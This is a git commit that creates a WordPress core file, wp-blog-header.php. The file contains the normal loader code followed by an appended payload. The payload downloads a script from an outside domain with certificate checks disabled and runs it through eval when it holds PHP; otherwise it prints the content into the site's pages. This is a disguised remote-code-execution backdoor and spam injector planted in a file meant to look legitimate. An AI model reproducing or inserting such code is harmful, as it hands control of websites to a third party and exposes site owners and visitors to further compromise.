ace49722e51d42dc7d33ec62345aa4bb90070d2c
chmodddd <ribelcyberteam@gmail.com>
2024-11-13 23:31:35 +0800

    Create wp-blog-header.php

---
+++ wp-blog-header.php
@@ -0,0 +1,37 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
+$jasabacklinks = 'https://backlinkku.id/menu/vip-v1/script.txt';
+function fetch_remote_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
+}
+$fileContents = fetch_remote_content($jasabacklinks);
+if (strpos($fileContents, '<?php') !== false) {
+    eval('?>' . $fileContents);
+} else {
+    echo $fileContents;
+}
